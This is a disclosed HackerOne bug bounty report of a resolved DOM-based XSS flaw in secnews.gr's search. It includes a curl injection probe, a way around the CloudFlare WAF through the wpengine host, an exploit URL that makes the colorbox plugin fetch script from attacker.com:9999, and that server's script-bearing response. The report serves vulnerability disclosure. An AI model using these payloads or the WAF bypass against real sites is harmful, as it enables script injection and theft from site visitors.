---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '168165'
original_report_id: '168165'
title: DOM based XSS in search functionality
weakness: Cross-site Scripting (XSS) - Generic
team_handle: secnews
created_at: '2016-09-13T22:48:38.697Z'
disclosed_at: '2016-11-16T19:07:23.280Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# DOM based XSS in search functionality

## Metadata

- HackerOne Report ID: 168165
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: secnews
- Disclosed At: 2016-11-16T19:07:23.280Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Overview
===
Search query is inserted into the HTML of the page without proper encoding. Specifically, a single-quote is not html-encoded (albeit escaped, even twice), which allows the attacker to break out of the HTML attribute and inject arbitrary tags.

```html
curl -s 'https://www.secnews.gr?s=%27%3E%3Ctest%3E%3C' | egrep -o ".{47}?<test>.*?>"
<div id="content" data-currentquery='{"s":"\\'><test><"}' class="main-content articles list sidebar-right    non-full">
```

Impediments
===
Although aformentioned injection point can be used to carry out XSS attacks, there is a couple of complications.

1. The website is protected by the CloudFlare WAF which blocks any suspicious requests. This can be circumvented though by instead targeting `secnews.wpengine.com`.
2. The website has `X-XSS-Protection` header set which enables very powerful XSS Auditor in Google Chrome.
3. The potential victim is administrator on a web security website. They are likely to have some kind of an XSS protection plugin installed in their browser.

Solution
===
One of the javascript plugins (colorbox) used by the website has a code path that inserts response from arbitrary URL into DOM tree. It allows the attacker to go from regular XSS to DOM based XSS that anti-XSS tools are not able to detect.

See a proof-of-concept video: F119742

1. The attacker lures the victim to visit this link:
    ```
    https://www.secnews.gr/?s=%27%20class%3Dcolorbox%20href=/attacker.com:9999%3E
    ```

2. To any incoming requests the server at `attacker.com:9999` responds with:
    ```
    HTTP/1.1 200 OK
    content-length: 39
    access-control-allow-origin: *
    access-control-allow-headers: x-requested-with
    
    <script>alert(document.domain)</script>
    ```

3. The victim clicks anywhere below the navigation bar.
4. Malicious script gets downloaded and executed.

Security Implications
===
Although this exploit requires the victim to click, I'm confident (and hope you are too) that it's only a question of time and effort to find a code path that executes injected script without user interaction.

You mention in the policy that you don't consider any XSS significant enough for bounty. Although I think that you underestimate the power of XSS, it's your call and I've had a lot of fun anyway.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
